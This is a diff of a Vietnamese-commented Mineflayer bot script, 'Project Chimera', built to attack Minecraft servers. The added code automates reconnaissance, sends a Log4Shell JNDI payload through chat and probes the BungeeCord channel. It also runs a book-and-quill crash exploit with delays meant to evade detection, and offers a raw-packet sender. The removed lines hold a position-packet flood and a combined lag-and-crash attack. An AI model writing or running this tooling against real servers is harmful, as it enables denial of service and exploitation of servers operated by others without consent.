@@ -1,24 +1,80 @@
-// file: interactive_bot_v4_robust.js
+// file: project_chimera_v6.js
 
 const mineflayer = require('mineflayer');
 const readline = require('readline');
 const { Vec3 } = require('vec3');
 
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+// --- SETUP GIAO DIỆN CONSOLE ---
+const rl = readline.createInterface({ 
+    input: process.stdin, 
+    output: process.stdout,
+    prompt: '> ' // Dấu nhắc lệnh
+});
 
-// --- UTILITY ---
-function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+// --- UTILITY: HÀM TẠO ĐỘ TRỄ ---
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 
-// --- ATTACK MODULES (Đã được bọc thép với try...catch) ---
+// ================================================================= //
+// MODULE 1: RECONNAISSANCE (TRINH SÁT)
+// ================================================================= //
+async function performRecon(bot) {
+    console.log('\x1b[36m%s\x1b[0m', '--- Giai đoạn 1: Bắt đầu Trinh sát ---');
+    
+    // 1. Lấy thông tin Server Brand (chỉ chạy một lần)
+    bot._client.once('brand', (brand) => {
+        console.log(`[RECON] Server Brand: ${brand}`);
+    });
+    // Gửi yêu cầu brand ngay lập tức
+    bot._client.write('brand', { brand: 'mineflayer' });
 
-async function testBookExploit(bot) {
+
+    // 2. Thử lấy danh sách Plugin
+    console.log('[RECON] Đang thử các lệnh để lấy danh sách plugin...');
+    const commandsToTry = ['pl', 'plugins', 'bukkit:pl', 'bukkit:plugins', '?'];
+    for (const cmd of commandsToTry) {
+        bot.chat(`/${cmd}`);
+        await sleep(500); // Chờ phản hồi
+    }
+    console.log('[RECON] Đã gửi các lệnh thăm dò. Hãy xem log chat để biết kết quả.');
+}
+
+// ================================================================= //
+// MODULE 2: AUTOMATED VULNERABILITY SCANNING (QUÉT LỖ HỔNG)
+// ================================================================= //
+async function performAutoScan(bot) {
+    console.log('\x1b[36m%s\x1b[0m', '--- Giai đoạn 2: Bắt đầu Quét Lỗ hổng Tự động ---');
+    
+    // 1. Test Log4Shell (vô hại, payload không trỏ đến server thật)
+    console.log('[AUTOSCAN] Đang kiểm tra Log4Shell...');
+    const log4shellPayload = `\${jndi:ldap://log4j.bot-test.${Math.random()}.com/a}`; // Thêm số ngẫu nhiên để tránh cache DNS
+    bot.chat(log4shellPayload);
+    console.log('[AUTOSCAN] Đã gửi payload. Hãy kiểm tra console server xem có lỗi "Error looking up JNDI resource" không.');
+    await sleep(500);
+
+    // 2. Test Deserialization cũ trên kênh BungeeCord
+    console.log('[AUTOSCAN] Đang kiểm tra lỗ hổng Deserialization cũ...');
     try {
-        console.log('\x1b[31m%s\x1b[0m', '[ATTACK] Bắt đầu Book Exploit...');
+        const fakePayload = Buffer.from("Chimera test payload");
+        bot._client.write('custom_payload', { channel: 'BungeeCord', data: fakePayload });
+        console.log('[AUTOSCAN] Đã gửi payload qua kênh BungeeCord.');
+    } catch (e) { /* Bỏ qua lỗi nếu kênh không tồn tại */ }
+}
+
+// ================================================================= //
+// MODULE 3: EVASIVE ATTACKS (TẤN CÔNG NÉ TRÁNH)
+// ================================================================= //
+async function evasiveBookExploit(bot) {
+    try {
+        console.log('\x1b[31m%s\x1b[0m', '[ATTACK] Bắt đầu Book Exploit (Chế độ Humanizer)...');
         const book = bot.inventory.findInventoryItem('writable_book');
-        if (!book) { throw new Error('Không tìm thấy "Book and Quill" trong túi đồ.'); }
-        
-        await bot.equip(book, 'hand');
-        await sleep(250 + Math.random() * 100);
+        if (!book) throw new Error('Không tìm thấy "Book and Quill".');
+
+        // Mô phỏng click chuột với độ trễ
+        await bot.equip(book, 'hand'); 
+        console.log('[HUMANIZER] Giả vờ suy nghĩ trước khi viết...');
+        await sleep(300 + Math.random() * 200); 
 
         const pages = Array(50).fill('{"text":"' + 'CRASH '.repeat(8000) + '"}');
         bot._client.write('edit_book', { hand: 0, pages: pages, title: 'The Final Chapter' });
@@ -28,133 +84,127 @@ async function testBookExploit(bot) {
     }
 }
 
-let lagInterval = null;
-function testPositionFlood(bot, pps) {
-    if (lagInterval) {
-        clearInterval(lagInterval);
-        lagInterval = null;
-        console.log('\x1b[32m%s\x1b[0m', '[ATTACK] Đã dừng Position Flood.');
-        return;
-    }
-    // Cung cấp giá trị mặc định nếu pps không hợp lệ
-    const packetsPerSecond = (typeof pps === 'number' && pps > 0) ? pps : 500;
-    console.log(`\x1b[31m%s\x1b[0m`, `[ATTACK] Bắt đầu Position Flood với ${packetsPerSecond} packets/giây. Gõ '!lag' lần nữa để dừng.`);
-    
-    lagInterval = setInterval(() => {
-        try {
-            bot.entity.position.x += (Math.random() - 0.5) * 0.001;
-            bot._client.write('position', { ...bot.entity.position, onGround: bot.entity.onGround });
-        } catch (e) {
-            // Hiếm khi xảy ra, nhưng để đề phòng bot crash khi đang flood
-            console.error('[LỖI Flood] Lỗi khi gửi gói tin vị trí:', e.message);
-            clearInterval(lagInterval);
-            lagInterval = null;
-        }
-    }, 1000 / packetsPerSecond);
-}
-
-async function testComboAttack(bot) {
+// ================================================================= //
+// MODULE 4: DYNAMIC EXPLOITATION (KHAI THÁC ĐỘNG)
+// ================================================================= //
+function sendRawPacket(bot, packetName, packetData) {
     try {
-        console.log('\x1b[35m%s\x1b[0m', '--- BẮT ĐẦU COMBO TẤN CÔNG ---');
-        const book = bot.inventory.findInventoryItem('writable_book');
-        if (!book) { throw new Error('Bot cần có "Book and Quill" để thực hiện combo.'); }
-
-        console.log('[COMBO GĐ1] Kích hoạt Position Flood...');
-        testPositionFlood(bot, 750, true); 
-
-        const lagDuration = 3000 + Math.random() * 2000;
-        console.log(`[COMBO GĐ1] Duy trì áp lực trong ${Math.round(lagDuration/1000)} giây...`);
-        await sleep(lagDuration);
-
-        console.log('[COMBO GĐ2] Tung đòn Book Exploit kết liễu!');
-        await testBookExploit(bot);
-
-        setTimeout(() => {
-            if (lagInterval) {
-                console.log('[COMBO] Nhiệm vụ hoàn thành. Dừng Position Flood.');
-                testPositionFlood(bot, 0, true); 
-            }
-        }, 2000);
-    } catch (err) {
-        console.error('\x1b[31m%s\x1b[0m', `[LỖI] Combo thất bại: ${err.message}`);
-        if(lagInterval) testPositionFlood(bot, 0, true); // Dừng flood nếu combo lỗi
+        const data = JSON.parse(packetData);
+        console.log(`[RAW] Đang gửi gói tin '${packetName}' với dữ liệu:`, data);
+        bot._client.write(packetName, data);
+        console.log('[RAW] Gói tin đã được gửi.');
+    } catch (e) {
+        console.error(`[LỖI RAW] Không thể gửi gói tin: ${e.message}. Dữ liệu có phải là JSON hợp lệ không?`);
     }
 }
 
-// --- COMMAND CENTER (Cập nhật logic lệnh !lag) ---
+
+// --- COMMAND CENTER ---
 function setupCommandHandler(bot) {
   rl.on('line', (line) => {
+    rl.pause(); // Tạm dừng để xử lý, tránh input chồng chéo
     const args = line.trim().split(' ');
-    const command = args[0].toLowerCase();
+    const command = args.shift().toLowerCase();
 
-    switch(command) {
-        case '!chat': bot.chat(args.slice(1).join(' ')); break;
-        case '!l': bot.chat(args.slice(1).join(' ')); break;
-        case '!book': testBookExploit(bot); break;
-        case '!lag':
-            const ppsArg = parseInt(args[1]);
-            if (args[1] && (isNaN(ppsArg) || ppsArg <= 0)) {
-                console.log("Sử dụng: !lag [số]. Vui lòng nhập một số dương cho packet/giây.");
-            } else {
-                testPositionFlood(bot, ppsArg); // ppsArg có thể là NaN hoặc undefined, hàm sẽ xử lý
-            }
-            break;
-        case '!combo': testComboAttack(bot); break; 
-        case '!help':
-            console.log(`
---- Bot V4 Robust Help ---
-!chat <msg>      : Gửi tin nhắn.
-!l <cmd>         : Thực thi lệnh.
-!book            : (Crash) Thực hiện Book Exploit (cần sách).
-!lag [số]        : (Lag) Bật/tắt Position Flood. Mặc định 500 pps.
-!combo           : (Lag + Crash) Thực hiện combo tấn công (cần sách).
-!quit            : Thoát bot.
+    // Dùng promise để xử lý các lệnh bất đồng bộ và prompt lại sau khi xong
+    Promise.resolve().then(async () => {
+        switch(command) {
+            case '!book': 
+                await evasiveBookExploit(bot); 
+                break;
+            case '!raw': 
+                if (args.length < 2) {
+                    console.log("Sử dụng: !raw <tên_packet> '<dữ_liệu_json>'");
+                    console.log("Ví dụ: !raw chat '{\"message\":\"Hello\"}'");
+                } else {
+                    const packetName = args.shift();
+                    const packetData = args.join(' ');
+                    sendRawPacket(bot, packetName, packetData);
+                }
+                break;
+            case '!help':
+                console.log(`
+--- Project Chimera Help ---
+!book           : (Crash) Thực hiện Book Exploit với chế độ né tránh.
+!raw <name> <json>: (Advanced) Gửi một gói tin thô tùy chỉnh.
+<bất cứ gì khác>: Sẽ được gửi dưới dạng chat trong game.
+!quit           : Thoát bot.
 ----------------------------`);
-            break;
-        case '!quit': bot.quit(); break;
-        default: if(command) console.log("Lệnh không hợp lệ. Gõ '!help' để xem danh sách.");
-    }
-    rl.prompt();
-  }).on('close', () => process.exit(0));
+                break;
+            case '!quit':
+                bot.quit(); 
+                break;
+            default: 
+                // Nếu không phải lệnh nào ở trên, gửi như một tin nhắn chat
+                bot.chat(line);
+        }
+    }).finally(() => {
+        if (bot.state !== 'disconnected') {
+            rl.resume();
+            rl.prompt();
+        }
+    });
+  });
 }
 
-// --- MAIN FUNCTION ---
-function startBot(config) {
+// --- MAIN BOT FUNCTION ---
+async function startBot(config) {
     const bot = mineflayer.createBot({ ...config });
 
-    bot.on('login', () => {
-        console.log('\x1b[32m%s\x1b[0m', `>>> Bot V4 đã vào game! Gõ '!help' để xem các lệnh.`);
+    bot.once('spawn', async () => {
+        console.log('\x1b[32m%s\x1b[0m', `>>> Project Chimera đã vào game! Bắt đầu thực hiện các giai đoạn...`);
         rl.prompt();
+        
+        try {
+            await performRecon(bot);
+            await sleep(2000);
+            await performAutoScan(bot);
+        } catch (e) {
+            console.error('[LỖI GIAI ĐOẠN TỰ ĐỘNG]:', e.message);
+        }
+
+        console.log('\x1b[32m%s\x1b[0m', '--- Các giai đoạn tự động đã hoàn tất. Bot sẵn sàng nhận lệnh thủ công. Gõ !help. ---');
         setupCommandHandler(bot);
     });
     
-    // --- EVENT HANDLERS (Đã được làm cho "bất tử") ---
-    bot.on('chat', (username, message) => { if (username === bot.username) return; readline.cursorTo(process.stdout, 0); console.log(`\r<${username}> ${message}`); rl.prompt(true); });
+    // --- ROBUST EVENT HANDLERS ---
+    bot.on('chat', (username, message) => {
+        if (username === bot.username) return;
+        readline.cursorTo(process.stdout, 0); // Di chuyển con trỏ về đầu dòng
+        console.log(`\r<${username}> ${message}`); // In tin nhắn và \r để ghi đè dấu nhắc lệnh
+        rl.prompt(true); // Hiển thị lại dấu nhắc lệnh
+    });
 
     bot.on('kicked', (reason, loggedIn) => {
         console.log('\n\x1b[31m%s\x1b[0m', '>>> BOT ĐÃ BỊ KICK! <<<');
-        let reasonText = reason; // Mặc định là chuỗi thô
+        let reasonText = reason;
         try {
-            // Mineflayer có thể đã parse sẵn, hoặc nó là chuỗi JSON
             reasonText = mineflayer.ChatMessage.fromNotch(reason).toString();
-        } catch (e) {
-            // Không sao, cứ dùng chuỗi thô. Không để bot crash vì lý do này.
-        }
+        } catch (e) { /* Không sao, dùng chuỗi thô */ }
         console.log('\x1b[31m%s\x1b[0m', `Lý do: ${reasonText}`);
         process.exit(1);
     });
 
-    bot.on('error', (err) => console.log('\n\x1b[31m%s\x1b[0m', `>>> Lỗi Bot: ${err.message}`));
-    bot.on('end', (reason) => { console.log('\n\x1b[33m%s\x1b[0m', `>>> Mất kết nối: ${reason}`); process.exit(0); });
+    bot.on('error', (err) => console.log('\n\x1b[31m%s\x1b[0m', `>>> Lỗi Bot: ${err.message || err}`));
+    bot.on('end', (reason) => { 
+        console.log('\n\x1b[33m%s\x1b[0m', `>>> Mất kết nối. Lý do: ${reason}`); 
+        process.exit(0);
+    });
 }
 
-// --- INITIALIZATION ---
-console.log('--- Bot V4 Robust Edition by You ---');
+// --- INITIALIZATION SCRIPT ---
+console.log('--- Project Chimera (v6 - God Tier) by You ---');
 rl.question('Server (ip:port): ', (address) => {
     rl.question('Tên Bot: ', (username) => {
         rl.question('Phiên bản (trống để auto): ', (version) => {
             const [host, portStr] = address.split(':');
-            startBot({ host, port: parseInt(portStr) || 25565, username: username || 'RobustBot', version: version || false });
+            startBot({ 
+                host: host, 
+                port: parseInt(portStr) || 25565, 
+                username: username || 'Chimera', 
+                version: version || false,
+                checkTimeoutInterval: 60 * 1000 // Tăng timeout để tránh bị ngắt kết nối khi server lag
+            });
         });
     });
 });
